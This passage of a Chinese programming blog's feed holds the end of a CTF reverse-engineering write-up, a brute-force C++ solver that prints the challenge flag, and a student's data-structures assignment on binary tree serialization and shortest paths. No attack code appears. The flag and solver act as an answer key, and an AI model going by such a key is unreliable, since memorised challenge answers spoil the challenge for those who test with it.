func2&lt;<span class="number">0</span>&gt; = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;uint m&gt;<span class="class"><span class="keyword">struct</span> <span class="title">TEST</span>&lt;0, m&gt; &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> uint value = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;uint n&gt;<span class="class"><span class="keyword">struct</span> <span class="title">TEST</span>&lt;n, 0&gt; &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> uint value = <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;&gt;<span class="class"><span class="keyword">struct</span> <span class="title">func4</span>&lt;1&gt; &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> uint value = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;&gt;<span class="class"><span class="keyword">struct</span> <span class="title">func4</span>&lt;2&gt; &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> uint value = <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以上是各个函数的边界条件，一定不能省略，否则跑不出来或者跑出来不对，<strong>尤其是func4的1和2</strong></p><p>因为c的执行效率比较高，抱着试一试的心态，写了个暴力算法进行求解，在int范围下尝试失败（因为涉及到了数据的平方，int类型会溢出），于是更换为long long 进行求解，虽然效率不高，但还是可以在十秒中左右得出结果。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">func2</span><span class="params">(LL n)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> n%<span class="number">2</span> + func2(n/<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">func3</span><span class="params">(LL n)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> n%<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">func1</span><span class="params">(LL n, LL l, LL r)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(l==r) <span class="keyword">return</span> l;</span><br><span class="line">LL mid = (l+r+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(n &lt; mid*mid)</span><br><span class="line"><span class="keyword">return</span> func1(n,l,mid<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> func1(n,mid,r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LL _func1(LL n)&#123;</span><br><span class="line"><span class="keyword">return</span> func1(n,<span class="number">1</span>,n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">nextn</span><span class="params">(LL n, LL m)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ((n % m != <span class="number">0</span>) * n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">nextm</span><span class="params">(LL n, LL m)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (m * m &lt;= n ? (m + <span class="number">1</span>) : <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">test</span><span class="params">(LL n,LL m)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(m == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> test(nextn(n,m) , nextm(n,m));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">func4</span><span class="params">(LL n)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> test(n,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************</span></span><br><span class="line"><span class="comment">x1 ~ x5</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//input: 963 4396 6666 1999 3141</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">// ans =  1927 8792 13332 3998 6282</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**********/</span></span><br><span class="line">LL input[] = &#123;<span class="number">963</span>,<span class="number">4396</span>,<span class="number">6666</span>,<span class="number">1999</span>,<span class="number">3141</span>&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"flag&#123;"</span>);</span><br><span class="line"><span class="keyword">for</span>(LL j = <span class="number">0</span>; j&lt;=<span class="number">4</span> ; j++)&#123;</span><br><span class="line">LL ans = input[j];</span><br><span class="line"><span class="keyword">for</span>(LL i=<span class="number">0</span>;i&lt;=<span class="number">300000000</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(func3(func2(i))==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span>(_func1(i) == ans)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lld"</span>,i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*if(i % 100000 == 0)</span></span><br><span class="line"><span class="comment">printf("%d finished\n",i);*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************</span></span><br><span class="line"><span class="comment">x6 = 1229</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**********/</span></span><br><span class="line"></span><br><span class="line">LL cnt=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(LL i=<span class="number">3</span>;i&lt;=<span class="number">10000</span>;i++)</span><br><span class="line"><span class="keyword">if</span>(func4(i)==<span class="number">1</span>)</span><br><span class="line">cnt++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lld&#125;"</span>,cnt);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag&#123;927369-19324816-44435556-3996001-9865881-1229&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="nisc-20190815" scheme="https://mrh1s.top/categories/write-up/nisc-20190815/"/>
    
    
  </entry>
  
  <entry>
    <title>期末大作业_二叉树的存储与图的最短路径</title>
    <link href="https://mrh1s.top/posts/36f51c45/"/>
    <id>https://mrh1s.top/posts/36f51c45/</id>
    <published>2019-06-14T12:51:14.000Z</published>
    <updated>2019-06-20T05:03:32.037Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p> <a href="\uploads\BinaryTree_ShortestPath.docx">实验报告</a> </p><h2 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h2><p>主要学习了一下递归函数的非递归写法</p><p>随机生成一棵树写得我很爽</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> FLAG;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BT</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> data;</span><br><span class="line">BT *lch, *rch;</span><br><span class="line"><span class="keyword">int</span> process;<span class="comment">//记录当前递归到左子树还是右子树 </span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Free_BT</span><span class="params">(BT *rt)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(rt == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">Free_BT(rt-&gt;lch);</span><br><span class="line">Free_BT(rt-&gt;rch);</span><br><span class="line"><span class="built_in">free</span>(rt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BT *<span class="title">Generate_BT</span><span class="params">(<span class="keyword">int</span> now, <span class="keyword">int</span> mind, <span class="keyword">int</span> maxd)</span></span>&#123;<span class="comment">//随机生成一棵二叉树 </span></span><br><span class="line">BT *rt = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>((rand()%<span class="number">10</span> &gt; <span class="number">3</span>)&amp;&amp;(now &lt;= maxd) || (now &lt; mind) )&#123;</span><br><span class="line">rt = (BT*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BT));</span><br><span class="line">rt-&gt;data = (rand()%<span class="number">26</span>) + <span class="string">'a'</span>; </span><br><span class="line">rt-&gt;lch = Generate_BT(now+<span class="number">1</span>, mind, maxd);</span><br><span class="line">rt-&gt;rch = Generate_BT(now+<span class="number">1</span>, mind, maxd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> rt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print_Manu</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1.采用二叉链式存储创建二叉树B1\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2.采用先序序列化显示输出序列，并存储到文件中\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3.从文件中读出序列，并反序列化的递归方法构造二叉树B2\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"4.从文件中读出序列，并反序列化的非递归方法构造二叉树B3\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"5.使用非递归的方法输出二叉树的中序遍历序列\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"6.使用非递归的方法输出二叉树的后序遍历序列\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"7.销毁释放二叉树B1,B2,B3\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0.退出\n\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dot_f</span><span class="params">(FILE *f)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(FLAG)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">","</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">","</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> FLAG = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dot</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(FLAG)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">","</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> FLAG = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">Read_node</span><span class="params">(FILE *f)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="built_in">fscanf</span>(f, <span class="string">"%c"</span>, &amp;c);</span><br><span class="line">&#125;<span class="keyword">while</span>(c == <span class="string">','</span>);</span><br><span class="line"><span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Pre_Order</span><span class="params">(BT *rt, FILE *f)</span></span>&#123;<span class="comment">//先序遍历显示输出序列 </span></span><br><span class="line">Dot_f(f);</span><br><span class="line"><span class="keyword">if</span>(rt == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"#"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"#"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, rt-&gt;data);</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"%c"</span>, rt-&gt;data);</span><br><span class="line"></span><br><span class="line">Pre_Order(rt-&gt;lch, f);</span><br><span class="line">Pre_Order(rt-&gt;rch, f);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BT *<span class="title">Deserialize_RE</span><span class="params">(FILE *f)</span></span>&#123;<span class="comment">//递归反序列化 </span></span><br><span class="line">BT *rt = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span> c = Read_node(f);</span><br><span class="line"><span class="keyword">if</span>(c == <span class="string">'#'</span>) <span class="keyword">return</span> rt;</span><br><span class="line">rt = (BT*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BT));</span><br><span class="line">rt-&gt;data = c;</span><br><span class="line">rt-&gt;lch = Deserialize_RE(f);</span><br><span class="line">rt-&gt;rch = Deserialize_RE(f);</span><br><span class="line"><span class="keyword">return</span> rt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BT *<span class="title">Deserialize_NOT</span><span class="params">(FILE *f)</span></span>&#123;<span class="comment">//非递归反序列化 </span></span><br><span class="line"><span class="built_in">stack</span>&lt;BT*&gt; mystack;</span><br><span class="line">BT *rt = <span class="literal">NULL</span>;</span><br><span class="line">BT *ret;</span><br><span class="line"><span class="keyword">char</span> c = Read_node(f);</span><br><span class="line"><span class="keyword">if</span>(c == <span class="string">'#'</span>) <span class="keyword">return</span> rt;</span><br><span class="line">rt = (BT*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BT));</span><br><span class="line">rt-&gt;process = <span class="number">1</span>;</span><br><span class="line">rt-&gt;data = c;</span><br><span class="line">mystack.push(rt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(mystack.empty() == <span class="number">0</span>)&#123;</span><br><span class="line">BT *t = mystack.top();</span><br><span class="line"><span class="keyword">if</span>(t-&gt;process == <span class="number">0</span>)&#123;<span class="comment">//验证该结点是否存在 </span></span><br><span class="line">t-&gt;data = Read_node(f);</span><br><span class="line"><span class="keyword">if</span>(t-&gt;data == <span class="string">'#'</span>)&#123;<span class="comment">//结点不存在 </span></span><br><span class="line"><span class="built_in">free</span>(t);</span><br><span class="line">ret = <span class="literal">NULL</span>;</span><br><span class="line">mystack.pop();</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="comment">//结点存在 </span></span><br><span class="line">t-&gt;process += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(t-&gt;process == <span class="number">1</span>)&#123;<span class="comment">//左子树 </span></span><br><span class="line">t-&gt;lch = (BT*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BT));</span><br><span class="line">mystack.push(t-&gt;lch);</span><br><span class="line">t-&gt;lch-&gt;process = <span class="number">0</span>;</span><br><span class="line">t-&gt;process += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(t-&gt;process == <span class="number">2</span>)&#123;<span class="comment">//右子树</span></span><br><span class="line">t-&gt;lch = ret;</span><br><span class="line">t-&gt;rch = (BT*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BT));</span><br><span class="line">mystack.push(t-&gt;rch);</span><br><span class="line">t-&gt;rch-&gt;process = <span class="number">0</span>;</span><br><span class="line">t-&gt;process += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="comment">//返回 </span></span><br><span class="line">t-&gt;rch = ret;</span><br><span class="line">mystack.pop();</span><br><span class="line">ret = t;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> rt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">In_Order</span><span class="params">(BT *rt)</span></span>&#123;</span><br><span class="line"><span class="built_in">stack</span>&lt;BT*&gt; mystack;</span><br><span class="line">BT *p;</span><br><span class="line">p = rt;</span><br><span class="line"><span class="keyword">while</span>(mystack.empty()==<span class="number">0</span> || p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(p != <span class="literal">NULL</span>)&#123;<span class="comment">//循环找到最左边的叶子 </span></span><br><span class="line">mystack.push(p);</span><br><span class="line">p = p-&gt;lch;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Dot();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"#,"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(mystack.empty() == <span class="number">0</span>)&#123;<span class="comment">//输出该叶子并且回退，然后找到最邻近的右儿子 </span></span><br><span class="line">p = mystack.top();</span><br><span class="line">mystack.pop();</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, p-&gt;data);</span><br><span class="line">p = p-&gt;rch;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">Dot();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"#"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Post_Order</span><span class="params">(BT *rt)</span></span>&#123;</span><br><span class="line"><span class="built_in">stack</span>&lt;BT*&gt; mystack;</span><br><span class="line">BT *p;</span><br><span class="line"><span class="keyword">if</span>(rt == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"#"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mystack.push(rt);</span><br><span class="line">rt-&gt;process = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(mystack.empty() == <span class="number">0</span>)&#123;</span><br><span class="line">p = mystack.top();</span><br><span class="line"><span class="keyword">if</span>(p-&gt;process == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(p == <span class="literal">NULL</span>)&#123;</span><br><span class="line">Dot();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"#"</span>);</span><br><span class="line">mystack.pop();</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;lch == <span class="literal">NULL</span>)&#123;</span><br><span class="line">Dot();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"#"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">mystack.push(p-&gt;lch);</span><br><span class="line">p-&gt;lch-&gt;process = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;process += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(p-&gt;process == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;rch == <span class="literal">NULL</span>)&#123;</span><br><span class="line">Dot();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"#"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">mystack.push(p-&gt;rch);</span><br><span class="line">p-&gt;rch-&gt;process = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;process += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Dot();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, p-&gt;data);</span><br><span class="line">mystack.pop();</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">BT *b1 = <span class="literal">NULL</span>;</span><br><span class="line">BT *b2 = <span class="literal">NULL</span>;</span><br><span class="line">BT *b3 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> Choice;</span><br><span class="line">FILE *f;</span><br><span class="line">Print_Manu();</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Input your choice:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;Choice);</span><br><span class="line"><span class="keyword">if</span>(!Choice) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">switch</span>(Choice)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:&#123;</span><br><span class="line"><span class="keyword">int</span> mind, maxd;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Input the minimum depth:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;mind);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Input the maximum depth:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;maxd);</span><br><span class="line"><span class="keyword">if</span>(mind &gt; maxd)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Invalid!\n\n"</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">Free_BT(b1); <span class="comment">//把之前储存的树销毁</span></span><br><span class="line">b1 = Generate_BT(<span class="number">1</span>, mind, maxd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Binary tree generated.\n\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:&#123;</span><br><span class="line">f = fopen(<span class="string">"tree.txt"</span>, <span class="string">"w"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"serialization_pre_order:"</span>);</span><br><span class="line">FLAG = <span class="number">0</span>;</span><br><span class="line">Pre_Order(b1, f);</span><br><span class="line">fclose(f);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:&#123;</span><br><span class="line">f = fopen(<span class="string">"tree.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">b2 = Deserialize_RE(f);</span><br><span class="line">fclose(f);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Succeeded to load in_order tree to b2.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:&#123;</span><br><span class="line">f = fopen(<span class="string">"tree.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">b3 = Deserialize_NOT(f);</span><br><span class="line">fclose(f);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Succeeded to load post_order tree to b3.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"serialization_in_order:"</span>);</span><br><span class="line">FLAG = <span class="number">0</span>;</span><br><span class="line">In_Order(b2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"serialization_post_order:"</span>);</span><br><span class="line">FLAG = <span class="number">0</span>;</span><br><span class="line">Post_Order(b3);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:&#123;</span><br><span class="line">Free_BT(b1);</span><br><span class="line">Free_BT(b2);</span><br><span class="line">Free_BT(b3);</span><br><span class="line">b1 = b2 = b3 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Succeeded to free b1,b2,b3!\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h2><p>dijkstra算法以及Floyd算法保存最短路径的方法</p><p><strong>dijkstra</strong>：在每次加入新点到集合中时，把这些点的father记为上一个点，最后一起逆序输出</p><p><strong>Floyd</strong>：在进行三重循环的时候，如果找到了最短路（i到j中有一个k结点），</p><p>那么就把”path(i)(j)”改为”path(i)(k)”，<strong>意味着从i到j的最短路上，i的下一个结点是 i到k的最短路上i的下一个结点</strong></p><p>这句话好好理解一下（是一种递归定义，无限递归后，最终path(i)(j)就是i到j最短路上i的下一个节点）</p><p>参考资料：<a href="https://blog.csdn.net/weixin_39956356/article/details/80620667" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39956356/article/details/80620667</a></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 500</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 1e9+7 </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[MAX+<span class="number">1</span>][MAX+<span class="number">1</span>], n;</span><br><span class="line"><span class="keyword">int</span> shortest[MAX+<span class="number">1</span>][MAX+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> dist[MAX+<span class="number">1</span>],path[MAX+<span class="number">1</span>][MAX+<span class="number">1</span>]; <span class="comment">//path数组负责记录从u到v，以u为起点的下一个结点的位置 </span></span><br><span class="line"><span class="keyword">char</span> name[MAX+<span class="number">1</span>][<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> fa[MAX+<span class="number">1</span>];<span class="comment">//用于在dijkstra里面保存某个结点的前一个结点 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print_Manu</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1.Import a map.(and store it in the disk)\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2.Calculate the shortest distance from a to b.\n"</span>);</span><br><span class="line"><span 